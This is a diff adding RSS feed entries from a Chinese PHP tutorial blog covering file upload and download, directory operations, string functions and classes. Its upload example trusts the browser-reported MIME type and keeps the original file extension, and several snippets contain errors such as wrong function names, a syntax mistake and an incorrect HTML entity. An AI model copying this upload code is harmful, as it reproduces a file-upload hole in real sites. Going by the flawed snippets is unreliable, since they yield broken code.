+    //2. 过滤上传文件的错误号
+    if($upfile[&amp;quot;error&amp;quot;]&amp;gt;0){
+        //获取错误信息
+        switch($upfile[&#39;error&#39;]){
+            case 1:
+                $info=&amp;quot;上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。&amp;quot;; 
+                break;
+            case 2:
+                $info=&amp;quot;上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。&amp;quot;; 
+                break;
+            case 3:
+                $info=&amp;quot;文件只有部分被上传。&amp;quot;; 
+                break;
+            case 4:
+                $info=&amp;quot;没有文件被上传。 &amp;quot;;
+            case 6:
+                $info=&amp;quot;找不到临时文件夹。&amp;quot;; 
+                break;
+            case 7:
+                $info=&amp;quot;文件写入失败&amp;quot;; 
+                break;
+        }
+
+        die(&amp;quot;上传文件错误，原因：&amp;quot;.$info);
+    }
+  
+    //3. 本次上传文件到小的过滤（自己选择）
+    if($upfile[&amp;quot;size&amp;quot;]&amp;gt;100000){
+        die(&amp;quot;上传文件大小超出限制！&amp;quot;);
+    }
+    
+    //4. 类型过滤
+    if(!in_array($upfile[&amp;quot;type&amp;quot;],$typelist)){
+        die(&amp;quot;上传文件类型非法！&amp;quot;.$upfile[&amp;quot;type&amp;quot;]);
+    }
+
+    //5. 上传后的文件名定义(随机获取一个文件名（保持后缀名不变）)
+    $fileinfo = pathinfo($upfile[&amp;quot;name&amp;quot;]);//解析上传文件名字
+    do{
+        $newfile= date(&amp;quot;YmdHis&amp;quot;).rand(1000,9999).&amp;quot;.&amp;quot;.$fileinfo[&amp;quot;extension&amp;quot;];
+    }while(file_exists($path.$newfile));
+    //6. 执行文件上传
+    //判断是否是一个上传的文件
+    if(is_uploaded_file($upfile[&amp;quot;tmp_name&amp;quot;])){
+        //执行文件上传（移动上传文件）
+        if(move_uploaded_file($upfile[&amp;quot;tmp_name&amp;quot;],$path.$newfile)){
+            echo &amp;quot;文件上传成功！&amp;quot;;
+            echo &amp;quot;&amp;lt;h3&amp;gt;&amp;lt;a href=&#39;index.php&#39;&amp;gt;浏览&amp;lt;/a&amp;gt;&amp;lt;/h3&amp;gt;&amp;quot;;
+        }else{
+            die(&amp;quot;上传文件失败&amp;quot;);
+        }
+    }else{
+        die(&amp;quot;不是一个上传文件！&amp;quot;);
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;下载:cf817d8c79d597602d7618c4a1130c46&#34;&gt;下载&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;h3 id=&#34;对于php无法解析的类型:cf817d8c79d597602d7618c4a1130c46&#34;&gt;对于php无法解析的类型&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;http://www.aa.com/xx.rar&amp;quot;&amp;gt;下载&amp;lt;/a &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;对于php能解析的文件-同时为了安全性:cf817d8c79d597602d7618c4a1130c46&#34;&gt;对于php能解析的文件(同时为了安全性)&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    header(&amp;quot;Content-type:text/html;charset=utf-8&amp;quot;);
+    $file_name = &amp;quot;文件.exe&amp;quot;;
+    $file_name=iconv(&amp;quot;utf-8&amp;quot;,&amp;quot;gb2312&amp;quot;,$file_name); //解决中文不能显示的问题 
+    $file_dir = &amp;quot;/public/www/download/&amp;quot;;
+    $file_path = $file_dir.$file_name;
+    if (!file_exists($file_path)) { //检查文件是否存在
+        echo &amp;quot;文件找不到&amp;quot;;
+        exit;
+    } else {
+        $file = fopen($file_path,&amp;quot;r&amp;quot;); // 打开文件
+        Header(&amp;quot;Accept-Ranges: bytes&amp;quot;);//代表支持断点续传
+        // 输入文件标签,下面3个Header是必须的
+        Header(&amp;quot;Content-type: application/octet-stream&amp;quot;);
+        Header(&amp;quot;Accept-Length: &amp;quot;.filesize($file_path));
+        Header(&amp;quot;Content-Disposition: attachment; filename=&amp;quot; . $file_name);
+        // 输出文件内容
+        echo fread($file,filesize($file_path));
+        fclose($file);
+        exit;
+    }
+?&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP之目录与文件</title>
+      <link>http://wyb0.com/posts/PHP%E4%B9%8B%E7%9B%AE%E5%BD%95%E4%B8%8E%E6%96%87%E4%BB%B6/</link>
+      <pubDate>Sun, 22 May 2016 16:29:47 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E4%B9%8B%E7%9B%AE%E5%BD%95%E4%B8%8E%E6%96%87%E4%BB%B6/</guid>
+      <description>
+
+&lt;h2 id=&#34;1-目录的操作:4fd6cf0d51b03c2fe6439209faf46b96&#34;&gt;1.目录的操作&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+  $path = &amp;quot;/var/www/html/php/dir.php&amp;quot;;
+  echo dirname($path).&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;  //返回上级路径
+  echo basename($path).&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;  //返回文件名部分
+  print_r(pathinfo($path));  //返回包含path信息的数组
+
+  echo &amp;quot;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&amp;quot;;
+
+  //readdir()从目录句柄读取条目，返回目录中的文件名，指针依次向后移动
+  $path = &amp;quot;D:/phpStudy/WWW/php&amp;quot;;
+  $dh = opendir($path);
+  while (false !== ($filename=readdir($dh))) {
+    echo $filename.&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;
+  }
+  rewinddir($dh);  //指针复位
+  echo readdir($dh);
+  closedir($dh);
+
+  mkdir(&amp;quot;./aaa&amp;quot;);//创建文件夹aaa
+  rmdir(&amp;quot;./aaa&amp;quot;);//删除文件夹aaa
+
+  file_put_contents(&amp;quot;aa.php&amp;quot;, &amp;quot;&amp;quot;);//创建文件aa.php
+  unlink(&amp;quot;./aa.php&amp;quot;);//删除文件aa.php
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;center&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/arrow.png&#34; alt=&#34;箭头&#34;&gt;
+&lt;/div&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dir.png&#34; alt=&#34;目录的操作&#34;&gt;
+&lt;/div&gt;
+
+&lt;/center&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;2-文件的读写:4fd6cf0d51b03c2fe6439209faf46b96&#34;&gt;2.文件的读写&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;fopen(filename,mode)和fclose(filename,mode)
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/file_open_mode.png&#34; alt=&#34;fopen()打开文件的模式&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;h5 id=&#34;例子:4fd6cf0d51b03c2fe6439209faf46b96&#34;&gt;例子：&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+$file = fopen(&amp;quot;test.txt&amp;quot;,&amp;quot;r&amp;quot;);
+$file = fopen(&amp;quot;/home/test/test.txt&amp;quot;,&amp;quot;r&amp;quot;);
+$file = fopen(&amp;quot;/home/test/test.gif&amp;quot;,&amp;quot;wb&amp;quot;);
+$file = fopen(&amp;quot;http://www.example.com/&amp;quot;,&amp;quot;r&amp;quot;);
+$file = fopen(&amp;quot;ftp://user:password@example.com/test.txt&amp;quot;,&amp;quot;w&amp;quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;读取内容&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;fread(h_file,length)  //读取打开文件的length个字节，返回读取的字符串  
+fgets(h_file,length)  //读取一行返回length个字节，不加length时默认1024个字节，失败返回false  
+fgetc(h_file)   //逐字读取
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;file_get_content()和file_put_content()&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;file_get_content($filename)可以得到文件中的所有内容  
+file_put_content($filename, $str)可以将字符串覆盖写入文件中  
+file_put_content($filename, $str, FILE_APPEND)可以将字符串追加到文件中
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;filetype()&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;filetype($filename)可以得到文件的类型
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;3-查看文件夹下的文件信息:4fd6cf0d51b03c2fe6439209faf46b96&#34;&gt;3.查看文件夹下的文件信息&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $path = &amp;quot;./&amp;quot;;
+    $filelist=array(&amp;quot;filesystem.php&amp;quot;);//要过滤掉的文件
+
+    //浏览指定目录下的文件，并使用表格输出
+    //path目录信息的过滤，判断path存在，并且是否是个目录
+    if(!file_exists($path) || !is_dir($path)){
+        die($path.&amp;quot;目录无效！&amp;quot;);
+    }
+    //2. 输出表头信息
+    echo &amp;quot;&amp;lt;h3&amp;gt;{$path}目录下的文件信息&amp;lt;h3&amp;gt;&amp;quot;;
+    echo &amp;quot;&amp;lt;table width=&#39;600&#39; border=&#39;0&#39;&amp;gt;&amp;quot;;
+    echo &amp;quot;&amp;lt;tr bgcolor=&#39;#cccccc&#39; align=&#39;left&#39;&amp;gt;&amp;quot;;
+    echo &amp;quot;&amp;lt;th&amp;gt;序号&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;名称&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;类型&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;大小&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;创建时间&amp;lt;/th&amp;gt;&amp;quot;;
+    echo &amp;quot;&amp;lt;/tr&amp;gt;&amp;quot;;
+
+    //打开这个目录，并遍历目录下面的所有文件
+    $dir = opendir($path);
+    if($dir){
+        $i=0;
+        //遍历目录中的文件,并输出文件的信息
+        while($f = readdir($dir)){
+            if($f==&amp;quot;.&amp;quot; || $f==&amp;quot;..&amp;quot; || in_array($f,$filelist)){
+                continue;//跳出本次循环，继续下一次遍历。
+            }
+            $file = trim($path,&amp;quot;/&amp;quot;).&amp;quot;/&amp;quot;.$f;
+            $i++;
+            echo &amp;quot;&amp;lt;tr&amp;gt;&amp;quot;;
+            echo &amp;quot;&amp;lt;td&amp;gt;{$i}&amp;lt;/td&amp;gt;&amp;quot;;
+            echo &amp;quot;&amp;lt;td&amp;gt;{$f}&amp;lt;/td&amp;gt;&amp;quot;;
+            echo &amp;quot;&amp;lt;td&amp;gt;&amp;quot;.filetype($file).&amp;quot;&amp;lt;/td&amp;gt;&amp;quot;;
+            echo &amp;quot;&amp;lt;td&amp;gt;&amp;quot;.filesize($file).&amp;quot;&amp;lt;/td&amp;gt;&amp;quot;;
+            echo &amp;quot;&amp;lt;td&amp;gt;&amp;quot;.date(&amp;quot;Y-m-d H:i:s&amp;quot;,filectime($file)).&amp;quot;&amp;lt;/td&amp;gt;&amp;quot;;
+            echo &amp;quot;&amp;lt;/tr&amp;gt;&amp;quot;;
+        }
+        closedir($dir); //关闭目录
+    }
+    echo &amp;quot;&amp;lt;tr bgcolor=&#39;#cccccc&#39; align=&#39;left&#39;&amp;gt;&amp;lt;td colspan=&#39;6&#39;&amp;gt;&amp;amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;
+    echo &amp;quot;&amp;lt;/table&amp;gt;&amp;quot;;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;center&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/arrow.png&#34; alt=&#34;箭头&#34;&gt;
+&lt;/div&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/file_info.png&#34; alt=&#34;查看文件夹下的文件信息&#34;&gt;
+&lt;/div&gt;
+
+&lt;/center&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP之字符串</title>
+      <link>http://wyb0.com/posts/PHP%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2/</link>
+      <pubDate>Sat, 21 May 2016 23:16:28 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2/</guid>
+      <description>
+
+&lt;h2 id=&#34;特点:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;特点&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;字符串可以使用数组的处理函数操作，但并不是真正的数组&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;双引号中的变量用{}括起来，因为字符串中若遇到$符号，解析器会尽可能多的获取后面的字符以组成一个合法的变量名&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $lamp = array(&#39;os&#39; =&amp;gt; &#39;Linux&#39;, &#39;webserver&#39; =&amp;gt; &#39;Apache&#39;, &#39;db&#39; =&amp;gt; &#39;Mysql&#39;, &#39;language&#39; =&amp;gt; &#39;PHP&#39;);
+
+
+    echo &amp;quot;A OS is $lamp[os].&amp;quot;;  // ok
+    echo &amp;quot;A OS is $lamp[&#39;os&#39;].&amp;quot;;  // false
+    echo &amp;quot;A OS is {$lamp[&#39;os&#39;]}.&amp;quot;;  //ok
+    echo &amp;quot;A OS is {$lamp[os]}.&amp;quot;;  // ok
+
+
+    echo &amp;quot;This square is $square-&amp;gt;width meters broad.&amp;quot;; //ok
+    echo &amp;quot;This square is $square-&amp;gt;width meters broad.&amp;quot;; //ok
+    echo &amp;quot;This square is $square-&amp;gt;width meters broad.&amp;quot;; //ok
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;常用字符串输出函数:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;常用字符串输出函数&lt;/h2&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;left&#34;&gt;函数名&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;功能描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;echo&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;输出字符串&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;print()&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;输出一个或多个字符串&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;die()&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;输出一条消息，并退出当前脚本&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;printf()&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;输出格式化字符串&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;sprintf()&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;把格式化字符串写入到一个变量中&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&#34;函数echo:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;函数echo()&lt;/h2&gt;
+
+&lt;p&gt;输出一个或多个字符串&lt;br /&gt;
+void echo(string arg1 [,string &amp;hellip;])&lt;/p&gt;
+
+&lt;h2 id=&#34;函数print:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;函数print()&lt;/h2&gt;
+
+&lt;p&gt;功能和echo()一样，它有返回值，若成功则返回1,否则返回0&lt;/p&gt;
+
+&lt;h2 id=&#34;函数die:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;函数die()&lt;/h2&gt;
+
+&lt;p&gt;该函数是exit()函数的别名&lt;br /&gt;
+若参数为字符串，则函数会在推出前输出它&lt;br /&gt;
+若参数为整数(0~254)，则值会被用作推出状态&lt;/p&gt;
+
+&lt;h2 id=&#34;函数printf:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;函数printf()&lt;/h2&gt;
+
+&lt;p&gt;输出格式化的字符串，和C语言中同名的函数用法一样&lt;br /&gt;
+第一个参数为必选项，是规定的字符串及如何格式化其中的变量&lt;br /&gt;
+可以有多个可选参数，是规定插入到第一个参数的格式化字符串中对应%符号处的参数&lt;/p&gt;
+
+&lt;h2 id=&#34;函数sprintf:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;函数sprintf()&lt;/h2&gt;
+
+&lt;p&gt;用法和Printf()类似，但他并不是输出字符串，而是格式化的字符串以返回值的形式写入到一个变量中&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;常用字符串格式化函数:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;常用字符串格式化函数&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;ltrim()：从字符串左删除空格或其他预定义字符串
+rtrim()：从字符串的末端开始删除空白字符串或其它预定义字符
+trim()：从字符串的两端删除空白字符和其他预定字符
+
+strtolower()：把字符串转换为小写
+strtoupper()：把字符串转换为大写
+ucfirst()：把字符串中的首字符转为大写
+ucwords():把字符串中每个单词的首自负转换为大写
+
+nl2br()：在字符串的每个新行之前插入HTML换行符
+htmlentities()：把字符转换为HTML实体
+htmlspecialchars()：把一些预定义的字符转换为HTML实体
+Stripslashes()：删除由addcslashes()函数添加的反斜杠
+number_format()：能过千位分组来格式化数字
+strip_tags()：剥去HTML,XML以及PHP的标签
+
+strrev()：反转字符串
+str_pad()：把字符串填充为新的长度
+md5()：将一个字符串进行MD5计算
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;过滤字符:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;过滤字符&lt;/h2&gt;
+
+&lt;p&gt;ltrim()、rtrim()、trim()&lt;br /&gt;
+第一个参数为待处理字符串，为必选项&lt;br /&gt;
+第二个参数是可选项，用于指定希望取出的字符，默认为：&lt;br /&gt;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;rdquo;&amp;ldquo;：空格&lt;br /&gt;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;ldquo;\0&amp;rdquo;：NULL&lt;br /&gt;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;ldquo;\t&amp;rdquo;：制表符&lt;br /&gt;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;ldquo;\n&amp;rdquo;：新行&lt;br /&gt;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;ldquo;\r&amp;rdquo;：回车&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $str = &amp;quot;123 This is a test ...&amp;quot;; //测试的字符串
+    echo ltrim($str,&amp;quot;0..9&amp;quot;); //过滤左侧的数字，输出This is a test ...
+    echo rtrim($str,&amp;quot;.&amp;quot;); //过滤右侧所有&amp;quot;.&amp;quot;,输出123 This is a test
+    echo trim $str,&amp;quot;0..9 A..Z .&amp;quot;; //过滤掉字符串两端的数字和大写字母还有&amp;quot;.&amp;quot;,输出:his is a test
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;大小写转换:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;大小写转换&lt;/h2&gt;
+
+&lt;p&gt;strtolower()：把字符串转换为小写&lt;br /&gt;
+strtoupper()：把字符串转换为大写&lt;br /&gt;
+ucfirst()：把字符串中的首字符转为大写&lt;br /&gt;
+ucwords():把字符串中每个单词的首自负转换为大写&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $lamp = &amp;quot;lamp is composed of Linux、Apache、MySQL and PHP&amp;quot;;
+    echo strtolower($lamp);
+    //输出：lamp is composed of linux apache mysql and php
+    echo strtoupper($lamp);
+    //输出：LAMP IS CONPOSED OF LINUX、APACHE MYSQL AND PHP
+    echo ucfirst($lamp);
+    //输出：Lamp is composed of Linux、Apache MySQL and PHP
+    echo ucwords($lamp);
+    //输出：Lamp Is Composed Of Linux、Apache、MySQL And PHP
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;函数nl2br:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;函数nl2br()&lt;/h2&gt;
+
+&lt;p&gt;在字符串中的每个新行&amp;rdquo;\n&amp;rdquo;之前插入HTML换行符&amp;rdquo;&lt;code&gt;&amp;lt;br /&amp;gt;&lt;/code&gt;&amp;ldquo;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    echo nl2br(&amp;quot;One line.\nAnother line.&amp;quot;);
+    // 在“\n”前加上&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;标记
+    /*输出以下两行结果
+    One line.&amp;lt;br/&amp;gt;
+    Another line.
+    */
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;函数htmlspecialchars:c5ba7528507e708f70023ec7ac6408f9&#34;&gt;函数htmlspecialchars()&lt;/h2&gt;
+
+&lt;p&gt;第一个参数是带有HTML标记待处理的字符串&lt;br /&gt;
+第二个参数用来决定引号的转换方式&lt;br /&gt;
+string htmlspecialchars(string string [,int quote_style[,string charset]])&lt;br /&gt;
+将HTML标记中的以下特殊字符转换成HTML实体：&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;left&#34;&gt;特殊字符&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;HTML实体&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;&amp;amp;(和号)&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;amp;amp;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;&amp;rdquo;(双引号)&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;amp;quot;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;&amp;rsquo;(单引号)&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;amp;#309;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;&amp;lt;(小于)&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;amp;lt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;&amp;gt;(大于)&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+    &amp;lt;?php
+        $str = &amp;quot;&amp;lt;B&amp;gt;WebServer:&amp;lt;/B&amp;gt; &amp;amp; &#39;Linux&#39; &amp;amp; &#39;Apache&#39;&amp;quot;;
+        //将有HTML标记和单引号的字符串
+        echo htmlspecialchars($str,ENT_COMPAT);
+        //转换为HTML标记和转换双引号
+        echo &amp;quot;&amp;lt;br&amp;gt;\n&amp;quot;;
+        echo htmlspecialchars($str,ENT_QUOTES);
+        //转换HTML标记和转换两种引号
+        echo &amp;quot;&amp;lt;br&amp;gt;\n&amp;quot;;
+        echo htmlspecialchars($str,ENT_NOQUOTES);
+        //转换HTML标记和不对引号转换
+        echo &amp;quot;&amp;lt;br&amp;gt;\n&amp;quot;;
+    ?&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP之面向对象</title>
+      <link>http://wyb0.com/posts/PHP%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</link>
+      <pubDate>Fri, 20 May 2016 16:07:55 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</guid>
+      <description>
+
+&lt;h2 id=&#34;面向对象:5c6593d80077ae6b6ba6c5030c3b0275&#34;&gt;面向对象&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;面向对象概念
+
+&lt;ul&gt;
+&lt;li&gt;面向对象是达到了软件工程的三个目标：重用性、灵活性和扩展性，使其编程的代码更加简洁、更易于维护、并且具有更强的可重用性。&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;类和对象的关系
+
+&lt;ul&gt;
+&lt;li&gt;在面向对象的编程语言中，类是一个对立的程序单位，而对象的抽象就是类。类描述了一组有相同特性(属性)和相同行为(方法)的对象。开发时要先抽象类再用该类去创建对象。而我们的程序中直接使用的是对象而不是类。&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;什么是类
+
+&lt;ul&gt;
+&lt;li&gt;在面向对象的编程语言中，类是一个对立的程序单位，是具有相同属性和服务的一组对象的集合。它为属于该类的所有对象提供了同意的抽象描述，其内部包括成员属性和服务的方法两个部分。&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;什么是对象
+
+&lt;ul&gt;
+&lt;li&gt;在客观世界里，所有的事物都是由对象和对象之间的联系组成的。对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位，一个对象由一组属性和有权对这些属性进行操作的一组服务的封装体。&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;类的声明:5c6593d80077ae6b6ba6c5030c3b0275&#34;&gt;类的声明&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;类名和变量名还有函数名的命名规则类似，都遵循PHP中定义名称的命名规则。&lt;/li&gt;
+&lt;li&gt;若类名由多个单词组成，习惯上每个单词的首字母要大写&lt;/li&gt;
+&lt;li&gt;类中成员可分为属性和方法&lt;/li&gt;
+&lt;li&gt;属性为静态描述，方法为动态描述&lt;/li&gt;
+&lt;li&gt;在类中声明成员属性时，变量前面一定要有关键字，如：public、private、static等&lt;/li&gt;
+&lt;li&gt;若不需要有特定意义的修饰，则使用var关键字&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;格式：
+[一些修饰类的关键字] class 类名 {
+    类中成员;
+}
+
+Class Person {
+成员属性：
+    姓名、性别、年龄、身高、体重、电话、住址等
+成员方法：
+    说话、学习、走路、吃饭、开车、使用手机等
+}
+
+例子：
+&amp;lt;?php
+    class Person {
+        var $name;
+        var $age;
+        var $sex;
+        function say() {
+            echo &amp;quot;人在说话&amp;quot;;
+        }
+        function run() {
+            echo &amp;quot;人在走路&amp;quot;;
+        }
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;实例化对象:5c6593d80077ae6b6ba6c5030c3b0275&#34;&gt;实例化对象&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;格式：
+$变量名 = new 类名称([参数列表]);
+$变量名 = new 类名称;
+
+例子：
+&amp;lt;?php
+    class Phone {
+    // ...
+    }
+    class Person {
+    // ...
+    }
+    $person1 = new Person();
+    $person2 = new Person();
+    $person3 = new Person;
+    $phone1 = new Phone();
+    $phton2 = new Phone();
+    $phton3 = new Phone;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;对象中成员的访问:5c6593d80077ae6b6ba6c5030c3b0275&#34;&gt;对象中成员的访问&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    /**
+    *声明一个人类Person，其中包含三个成员属性和两个成员方法
+    */
+    class Person
+    {
+        var $name;
+        var $age;
+        var $sex;
+        
+        function say() {
